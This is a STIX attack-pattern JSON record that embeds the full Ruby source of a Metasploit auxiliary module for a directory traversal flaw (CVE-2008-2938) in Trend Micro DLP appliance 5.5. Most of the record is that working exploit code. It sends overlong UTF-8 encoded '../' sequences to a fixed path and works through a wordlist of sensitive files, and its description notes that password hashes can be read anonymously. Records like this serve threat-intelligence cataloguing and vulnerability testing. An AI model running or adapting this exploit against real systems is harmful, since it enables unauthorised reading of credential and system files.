{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef5016cc-b909-4c0f-81f9-2502f5fdbe33",
    "created": "2024-08-14T16:23:08.689456Z",
    "modified": "2024-08-14T16:23:08.68946Z",
    "name": "TrendMicro Data Loss Prevention 5.5 Directory Traversal",
    "description": " This module tests whether a directory traversal vulnerablity is present in Trend Micro DLP (Data Loss Prevention) Appliance v5.5 build <= 1294. The vulnerability appears to be actually caused by the Tomcat UTF-8",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/trendmicro_dlp_traversal.rb",
            "external_id": "trendmicro_dlp_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "http://tomcat.apache.org/"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2938"
        },
        {
            "source_name": "reference",
            "url": "http://www.securityfocus.com/archive/1/499926"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'TrendMicro Data Loss Prevention 5.5 Directory Traversal',\n      'Description' => %q{\n        This module tests whether a directory traversal vulnerablity is present\n        in Trend Micro DLP (Data Loss Prevention) Appliance v5.5 build <= 1294.\n        The vulnerability appears to be actually caused by the Tomcat UTF-8\n        bug which is implemented in module tomcat_utf8_traversal CVE 2008-2938.\n        This module simply tests for the same bug with Trend Micro specific settings.\n        Note that in the Trend Micro appliance, /etc/shadow is not used and therefore\n        password hashes are stored and anonymously accessible in the passwd file.\n        },\n      'References' => [\n        [ 'URL', 'http://tomcat.apache.org/' ],\n        [ 'OSVDB', '47464' ],\n        [ 'OSVDB', '73447' ],\n        [ 'CVE', '2008-2938' ],\n        [ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],\n        [ 'EDB', '17388' ],\n        [ 'BID', '48225' ],\n      ],\n      'Author' => [ 'aushack' ],\n      'License' => MSF_LICENSE,\n      'DisclosureDate' => 'Jan 9 2009'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptPath.new('SENSITIVE_FILES', [\n          true, 'File containing senstive files, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'sensitive_files.txt')\n        ]),\n      ]\n    )\n  end\n\n  def extract_words(wordfile)\n    return [] unless wordfile && File.readable?(wordfile)\n\n    begin\n      File.readlines(wordfile, chomp: true)\n    rescue ::StandardError => e\n      elog(e)\n      []\n    end\n  end\n\n  def find_files(files)\n    traversal = '/%c0%ae%c0%ae'\n\n    res = send_request_raw(\n      {\n        'method' => 'GET',\n        'uri' => '/dsc/' + traversal * 10 + files # We know depth is 10\n      }, 25\n    )\n    if (res && (res.code == 200))\n      print_status(\"Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \\r\\n#{res.body}\")\n      @files_found << files\n    elsif (res && res.code)\n      vprint_status(\"Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}\")\n    end\n  end\n\n  def run_host(_ip)\n    @files_found = []\n\n    begin\n      print_status(\"Attempting to connect to #{rhost}:#{rport}\")\n      res = send_request_raw(\n        {\n          'method' => 'GET',\n          'uri' => '/dsc/'\n        }, 25\n      )\n\n      if res\n        extract_words(datastore['SENSITIVE_FILES']).each do |files|\n          find_files(files) unless files.empty?\n        end\n      end\n\n      if !@files_found.empty?\n        print_good('File(s) found:')\n\n        @files_found.each do |f|\n          print_good(f)\n        end\n      else\n        print_error('No File(s) found')\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ aushack ]",
        ""
    ],
    "x_mitre_disclosure_date": "Jan 9 2009"
}